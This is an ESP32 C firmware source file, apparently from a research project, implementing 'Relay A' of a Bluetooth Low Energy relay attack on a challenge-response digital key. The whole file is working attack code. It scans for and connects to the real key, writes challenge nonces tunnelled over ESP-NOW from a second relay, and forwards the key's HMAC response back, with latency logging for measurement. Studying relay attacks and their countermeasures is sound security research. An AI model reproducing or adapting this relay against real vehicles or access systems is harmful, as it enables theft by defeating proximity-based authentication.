/*
 * Relay A — BLE central (near the phone/key) + ESP-NOW link.
 *
 * Role in the attack:
 *   - receives the challenge from Relay B over ESP-NOW (LINK_MSG_CHALLENGE: [seq][nonce]);
 *   - writes the nonce to the CHALLENGE characteristic of the real key;
 *   - receives the HMAC through the key's notify and returns it over ESP-NOW (LINK_MSG_RESPONSE:
 *     [seq][turnaround of A][HMAC]), with the same seq as the challenge.
 *
 * Two halves:
 *   - SELFTEST (RELAY_LINK_SELFTEST 1): Milestone 1, no BLE. It impersonates the key and echoes
 *     the challenge straight back, so that Relay B can measure the pure tunnel RTT.
 *   - BLE (RELAY_LINK_SELFTEST 0): Milestone 2. A NimBLE central that reuses the logic of
 *     vehicle/main.c (scan by SVC_UUID -> connect -> discovery -> notify), but WITHOUT
 *     generating a nonce, WITHOUT checking the HMAC and WITHOUT measuring RTT: Relay A is a dumb
 *     pipe. It writes to the key with a response (ble_gattc_write_flat), just as the vehicle does
 *     in the baseline, so the only difference measured is the relay hop.
 *
 * Execution context: the ESP-NOW callback (on_link_rx) runs in the WiFi task and must not do
 * long work; so the challenge arriving from the tunnel is queued and the GATT write happens in
 * the 'write_worker' task. The reverse path (key notify -> tunnel) runs in the NimBLE host task
 * and calls link_send directly (esp_now_send does not block).
 */

#include "relay_a.h"
#include "relay_config.h"
#include "link.h"
#include "ble_contract.h"
#include "ble_link_params.h"
#include "run_meta.h"

#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include "esp_log.h"
#include "esp_timer.h"

#include "cyd_display.h"
#include "cyd_led.h"
#include "cyd_ui.h"

/* The challenge frame carries the seq (4 B) followed by the nonce from the contract. */
_Static_assert(LINK_CHAL_LEN == LINK_SEQ_LEN + NONCE_LEN, "LINK_CHAL_LEN does not match NONCE_LEN");
_Static_assert(LINK_RESP_LEN == LINK_SEQ_LEN + 4 + RESPONSE_LEN, "LINK_RESP_LEN does not match RESPONSE_LEN");

static const char *TAG = "RELAY_A";

/* Accent color of Relay A (purple) and the card indices in the UI. */
#define ACCENT 0x7C4DFF
enum { F_TUNNEL = 0, F_KEY = 1, F_LINK = 2 };

/* Counters shown on the display (valid in both modes). */
static uint32_t s_from_tunnel;   /* challenges received from Relay B */
static uint32_t s_from_key;      /* responses from the key (or echoed in the self-test) */

/* Sets up the display, LED and UI. Called at the start of relay_a_start (both modes). */
static void relay_a_ui_init(void)
{
    cyd_display_init();
    cyd_led_init();
    cyd_display_set_backlight(90);
    cyd_ui_cfg_t cfg = {
        .title  = "RELAY A",
        .accent = ACCENT,
        .mascot = CYD_MASCOT_RELAY,
        .fields = { "From tunnel", "From key", "Key", NULL },
        .hex0   = "nonce",
        .hex1   = NULL,
    };
    cyd_ui_init(&cfg);
    cyd_ui_set_field(F_TUNNEL, "0");
    cyd_ui_set_field(F_KEY, "0");
    cyd_ui_set_field(F_LINK, "-");
}

#if !RELAY_LINK_SELFTEST

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"

#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "host/ble_hs.h"
#include "host/ble_gatt.h"
#include "host/util/util.h"

static uint8_t  own_addr_type;
static uint16_t g_conn = BLE_HS_CONN_HANDLE_NONE;

/* Handles discovered on the current connection to the key. */
static uint16_t svc_start, svc_end;
static uint16_t h_challenge, h_response, h_cccd;

/* Key-bound queue (tunnel -> key): seq + nonce to write. Filled in the ESP-NOW callback (WiFi
 * task) and consumed by the write_worker task (which may safely call the GATT API). */
typedef struct { uint32_t seq; uint8_t data[NONCE_LEN]; } chal_item_t;
static QueueHandle_t chal_q;

/* Per-round measurements (paper): turnaround of A = challenge written to the key -> notify from
 * the key (BLE A<->key + HMAC computation). The seq and the nonce (4 B) correlate with the other logs. */
static int64_t           s_t_write_us;
static uint8_t           s_nonce4[4];
static volatile uint32_t s_seq;      /* round assigned by Relay B to the challenge in flight */
static uint32_t s_disconnects;       /* drops of the key connection since boot (M-12) */

static void start_scan(void);
static int  gap_event(struct ble_gap_event *event, void *arg);

/* ---- key response -> tunnel --------------------------------------------- */

static void handle_notify(struct ble_gap_event *event)
{
    if (event->notify_rx.attr_handle != h_response) return;

    uint8_t resp[RESPONSE_LEN];
    uint16_t olen = 0;
    ble_hs_mbuf_to_flat(event->notify_rx.om, resp, RESPONSE_LEN, &olen);
    if (olen != RESPONSE_LEN) {
        ESP_LOGW(TAG, "key notify with %u B (expected %d); not forwarding", olen, RESPONSE_LEN);
        return;
    }

    /* Local turnaround of A (challenge written to the key -> HMAC back): BLE A<->key + HMAC
     * computation in the key. Parseable CSVA line per round, correlated by seq. */
    int64_t turn = esp_timer_get_time() - s_t_write_us;
    int8_t rssi = 0;
    ble_gap_conn_rssi(g_conn, &rssi);
    uint32_t seq = s_seq;
    ESP_LOGI(TAG, "HOP A rx_resp round=%lu nonce=%02x%02x%02x%02x turnaround=%lld us rssi=%d dBm",
             (unsigned long) seq, s_nonce4[0], s_nonce4[1], s_nonce4[2], s_nonce4[3],
             (long long) turn, rssi);
    uint32_t tx_failures = 0;
    link_tx_stats(&tx_failures, NULL);
    ESP_LOGI(TAG, "CSVA,%lu,%02x%02x%02x%02x,%lld,%d,%lu",
             (unsigned long) seq, s_nonce4[0], s_nonce4[1], s_nonce4[2], s_nonce4[3],
             (long long) turn, rssi, (unsigned long) tx_failures);

    /* Return frame: [seq][turnaround of A in us][HMAC]. */
    uint32_t turn_u32 = (turn < 0) ? 0 : (turn > (int64_t) UINT32_MAX) ? UINT32_MAX : (uint32_t) turn;
    uint8_t frame[LINK_RESP_LEN];
    memcpy(frame, &seq, LINK_SEQ_LEN);
    memcpy(frame + LINK_SEQ_LEN, &turn_u32, 4);
    memcpy(frame + LINK_SEQ_LEN + 4, resp, RESPONSE_LEN);

    char lbl[24], val[16];                                                /* V-12: response A -> B */
    cyd_fmt_us(val, sizeof val, turn);
    snprintf(lbl, sizeof lbl, "key %s", val);
    cyd_ui_link_pulse(1, lbl);
    ESP_LOGI(TAG, "HMAC from key (%u B) -> tunnel", olen);
    link_send(LINK_MSG_RESPONSE, frame, sizeof frame);

    s_from_key++;
    cyd_ui_set_field(F_KEY, "%lu", (unsigned long) s_from_key);
    cyd_ui_pulse();
}

/* ---- GATT discovery (chained through callbacks, as in the vehicle) ------ */

static int on_subscribe(uint16_t conn, const struct ble_gatt_error *err,
                        struct ble_gatt_attr *attr, void *arg)
{
    if (err->status != 0) {
        ESP_LOGE(TAG, "notify subscription failed (status=%d)", err->status);
        return 0;
    }
    ESP_LOGI(TAG, "subscribed to key notify; ready to forward tunnel challenges");
    return 0;
}

static int on_disc_dsc(uint16_t conn, const struct ble_gatt_error *err,
                       uint16_t chr_val_handle, const struct ble_gatt_dsc *dsc, void *arg)
{
    if (err->status == 0) {
        if (ble_uuid_cmp(&dsc->uuid.u, BLE_UUID16_DECLARE(0x2902)) == 0) {
            h_cccd = dsc->handle;
        }
    } else if (err->status == BLE_HS_EDONE) {
        if (h_cccd == 0) { ESP_LOGE(TAG, "CCCD (0x2902) missing"); return 0; }
        uint8_t enable[2] = {0x01, 0x00};
        ble_gattc_write_flat(conn, h_cccd, enable, sizeof enable, on_subscribe, NULL);
    } else {
        ESP_LOGE(TAG, "disc dsc error=%d", err->status);
    }
    return 0;
}

static int on_disc_chr_response(uint16_t conn, const struct ble_gatt_error *err,
                                const struct ble_gatt_chr *chr, void *arg)
{
    if (err->status == 0) {
        h_response = chr->val_handle;
    } else if (err->status == BLE_HS_EDONE) {
        if (h_response == 0) { ESP_LOGE(TAG, "RESPONSE characteristic missing"); return 0; }
        ble_gattc_disc_all_dscs(conn, h_response, svc_end, on_disc_dsc, NULL);
    } else {
        ESP_LOGE(TAG, "disc chr response error=%d", err->status);
    }
    return 0;
}

static int on_disc_chr_challenge(uint16_t conn, const struct ble_gatt_error *err,
                                 const struct ble_gatt_chr *chr, void *arg)
{
    if (err->status == 0) {
        h_challenge = chr->val_handle;
    } else if (err->status == BLE_HS_EDONE) {
        if (h_challenge == 0) { ESP_LOGE(TAG, "CHALLENGE characteristic missing"); return 0; }
        ble_gattc_disc_chrs_by_uuid(conn, svc_start, svc_end,
                                    &CHR_RESPONSE_UUID.u, on_disc_chr_response, NULL);
    } else {
        ESP_LOGE(TAG, "disc chr challenge error=%d", err->status);
    }
    return 0;
}

static int on_disc_svc(uint16_t conn, const struct ble_gatt_error *err,
                       const struct ble_gatt_svc *svc, void *arg)
{
    if (err->status == 0) {
        svc_start = svc->start_handle;
        svc_end   = svc->end_handle;
    } else if (err->status == BLE_HS_EDONE) {
        if (svc_start == 0) { ESP_LOGE(TAG, "key service not found"); return 0; }
        ESP_LOGI(TAG, "service at %u..%u", svc_start, svc_end);
        ble_gattc_disc_chrs_by_uuid(conn, svc_start, svc_end,
                                    &CHR_CHALLENGE_UUID.u, on_disc_chr_challenge, NULL);
    } else {
        ESP_LOGE(TAG, "disc svc error=%d", err->status);
    }
    return 0;
}

/* ---- challenge write to the key ----------------------------------------- */

static int on_write_challenge(uint16_t conn, const struct ble_gatt_error *err,
                              struct ble_gatt_attr *attr, void *arg)
{
    if (err->status != 0) ESP_LOGE(TAG, "challenge write to key error=%d", err->status);
    return 0;
}

/* Worker task: tunnel challenge -> write to the key's CHALLENGE characteristic. */
static void write_worker(void *arg)
{
    chal_item_t it;
    for (;;) {
        if (xQueueReceive(chal_q, &it, portMAX_DELAY) != pdTRUE) continue;

        if (g_conn == BLE_HS_CONN_HANDLE_NONE || h_challenge == 0) {
            ESP_LOGW(TAG, "challenge arrived but the key is not ready; dropping");
            continue;
        }
        s_t_write_us = esp_timer_get_time();
        memcpy(s_nonce4, it.data, 4);
        s_seq = it.seq;
        ESP_LOGI(TAG, "HOP A tx_chal round=%lu nonce=%02x%02x%02x%02x t=%lld us",
                 (unsigned long) it.seq, it.data[0], it.data[1], it.data[2], it.data[3],
                 (long long) s_t_write_us);
        int rc = ble_gattc_write_flat(g_conn, h_challenge, it.data, NONCE_LEN,
                                      on_write_challenge, NULL);
        if (rc != 0) ESP_LOGE(TAG, "ble_gattc_write_flat rc=%d", rc);
    }
}

/* ---- GAP: scan, connection, notify (as in the vehicle) ------------------ */

static bool adv_has_service(const uint8_t *data, uint8_t len)
{
    struct ble_hs_adv_fields f;
    if (ble_hs_adv_parse_fields(&f, data, len) != 0) return false;
    for (int i = 0; i < f.num_uuids128; i++) {
        if (ble_uuid_cmp(&f.uuids128[i].u, &SVC_UUID.u) == 0) return true;
    }
    return false;
}

static int gap_event(struct ble_gap_event *event, void *arg)
{
    switch (event->type) {

    case BLE_GAP_EVENT_DISC:
        if (!adv_has_service(event->disc.data, event->disc.length_data)) break;
        ESP_LOGI(TAG, "key found, connecting...");
        ble_gap_disc_cancel();
        {
            struct ble_gap_conn_params cp = ble_link_conn_params();   /* M-09b */
            if (ble_gap_connect(own_addr_type, &event->disc.addr, 30000, &cp,
                                gap_event, NULL) != 0) {
                ESP_LOGE(TAG, "ble_gap_connect failed; back to scanning");
                start_scan();
            }
        }
        break;

    case BLE_GAP_EVENT_CONNECT:
        if (event->connect.status == 0) {
            g_conn = event->connect.conn_handle;
            svc_start = svc_end = 0;
            h_challenge = h_response = h_cccd = 0;
            ESP_LOGI(TAG, "connected to key (handle %u); discovering service", g_conn);
            ble_link_log_conn(TAG, g_conn);                                    /* M-10 */
            ble_gattc_exchange_mtu(g_conn, ble_link_mtu_exchange_cb, NULL);   /* M-11 */
            cyd_ui_set_state("key connected", 0x1AA260);
            cyd_ui_set_field(F_LINK, "ok");
            cyd_ui_set_link(CYD_LINK_BLE, 1);                             /* V-06 */
            ble_gattc_disc_svc_by_uuid(g_conn, &SVC_UUID.u, on_disc_svc, NULL);
        } else {
            ESP_LOGE(TAG, "connection failed (status=%d)", event->connect.status);
            start_scan();
        }
        break;

    case BLE_GAP_EVENT_DISCONNECT:
        s_disconnects++;                                                  /* M-12 */
        ESP_LOGW(TAG, "key disconnected (reason=%d, disconnects=%lu); back to scanning",
                 event->disconnect.reason, (unsigned long) s_disconnects);
        g_conn = BLE_HS_CONN_HANDLE_NONE;
        h_challenge = h_response = h_cccd = 0;
        cyd_ui_set_field(F_LINK, "-");
        cyd_ui_set_link(CYD_LINK_BLE, 0);                                 /* V-06 */
        start_scan();
        break;

    case BLE_GAP_EVENT_CONN_UPDATE:                                       /* M-10 */
        if (event->conn_update.status == 0)
            ble_link_log_conn(TAG, event->conn_update.conn_handle);
        break;

    case BLE_GAP_EVENT_MTU:                                               /* M-11 */
        ble_link_log_mtu(TAG, event->mtu.conn_handle, event->mtu.value);
        break;

    case BLE_GAP_EVENT_NOTIFY_RX:
        handle_notify(event);
        break;

    default:
        break;
    }
    return 0;
}

static void start_scan(void)
{
    struct ble_gap_disc_params dp = {0};
    dp.filter_duplicates = 1;
    dp.passive = 0;
    int rc = ble_gap_disc(own_addr_type, BLE_HS_FOREVER, &dp, gap_event, NULL);
    if (rc != 0) ESP_LOGE(TAG, "ble_gap_disc rc=%d", rc);
    else { ESP_LOGI(TAG, "scanning for the key service..."); cyd_ui_set_state("searching key", ACCENT); }
}

/* ---- host lifecycle ----------------------------------------------------- */

static void on_sync(void)
{
    if (ble_hs_util_ensure_addr(0) != 0) { ESP_LOGE(TAG, "no BLE address"); return; }
    if (ble_hs_id_infer_auto(0, &own_addr_type) != 0) { ESP_LOGE(TAG, "address inference failed"); return; }
    start_scan();
}

static void on_reset(int reason) { ESP_LOGE(TAG, "BLE reset (reason=%d)", reason); }

static void host_task(void *param)
{
    nimble_port_run();
    nimble_port_freertos_deinit();
}

#endif /* !RELAY_LINK_SELFTEST */

/* ------------------------------------------------------------------------- */
/* Receives frames from Relay B. Runs in the WiFi task context.              */
/* ------------------------------------------------------------------------- */
static void on_link_rx(link_msg_type_t type, const uint8_t *data, size_t len)
{
    switch (type) {
    case LINK_MSG_CHALLENGE:
        cyd_ui_link_pulse(0, NULL);                                           /* V-12: challenge B -> A */
        s_from_tunnel++;
        cyd_ui_set_field(F_TUNNEL, "%lu", (unsigned long) s_from_tunnel);
        cyd_ui_set_hex(0, data + (len >= LINK_SEQ_LEN ? LINK_SEQ_LEN : 0),
                       (int) (len >= LINK_SEQ_LEN ? len - LINK_SEQ_LEN : len));
        cyd_ui_pulse();
#if RELAY_LINK_SELFTEST
        /* Self-test: echo the response right away (impersonates the key). */
        ESP_LOGI(TAG, "[selftest] challenge received (%d B); echoing the response", (int) len);
        link_send(LINK_MSG_RESPONSE, data, len);
        s_from_key++;   /* in the self-test Relay A echoes, which counts as a "response" */
        cyd_ui_set_field(F_KEY, "%lu", (unsigned long) s_from_key);
#else
    {
        /* Format [seq][nonce]: any other length is garbage and must not reach the key. */
        if (len != LINK_CHAL_LEN) {
            ESP_LOGW(TAG, "tunnel challenge with %u B (expected %d); dropping",
                     (unsigned) len, LINK_CHAL_LEN);
            break;
        }
        /* Queue it for the worker task to write to the key (no GATT calls here). */
        chal_item_t it;
        memcpy(&it.seq, data, LINK_SEQ_LEN);
        memcpy(it.data, data + LINK_SEQ_LEN, NONCE_LEN);
        if (xQueueSend(chal_q, &it, 0) != pdTRUE)
            ESP_LOGW(TAG, "challenge queue full; dropping");
    }
#endif
        break;
    default:
        break;
    }
}

void relay_a_start(void)
{
    relay_a_ui_init();
    run_meta_print("relay-a");                                            /* M-13b */
    cyd_ui_splash(run_meta_commit(), 2000);                               /* V-15 */
#if RELAY_LINK_SELFTEST
    cyd_ui_set_tag("SELFTEST");                                           /* V-06 */
#else
    cyd_ui_set_tag("CHAIN");
    cyd_ui_set_link(CYD_LINK_BLE, 0);                                     /* key not connected yet */
#endif
#if RELAY_LINK_SELFTEST
    cyd_ui_set_state("tunnel self-test", ACCENT);
    cyd_ui_set_field(F_LINK, "echo");
    ESP_ERROR_CHECK(link_init(on_link_rx));
    cyd_ui_set_link(CYD_LINK_ESPNOW, 1);                                  /* V-06 */
    ESP_LOGI(TAG, "Relay A started (tunnel self-test; echoing challenges as if it were the key)");
#else
    /* Create the queue and the worker task BEFORE link_init (which registers the ESP-NOW
     * callback), so no frame reaches on_link_rx while the queue is still NULL. */
    chal_q = xQueueCreate(4, sizeof(chal_item_t));
    if (chal_q == NULL) { ESP_LOGE(TAG, "no challenge queue"); return; }
    xTaskCreate(write_worker, "write_wk", 4096, NULL, 10, NULL);

    ESP_ERROR_CHECK(link_init(on_link_rx));
    cyd_ui_set_link(CYD_LINK_ESPNOW, 1);                                  /* V-06 */

    esp_err_t ret = nimble_port_init();
    if (ret != ESP_OK) { ESP_LOGE(TAG, "nimble_port_init rc=%d", ret); return; }

    ble_hs_cfg.reset_cb = on_reset;
    ble_hs_cfg.sync_cb  = on_sync;

    nimble_port_freertos_init(host_task);
    ESP_LOGI(TAG, "Relay A started (BLE central: connects to the key and tunnels)");
#endif
}
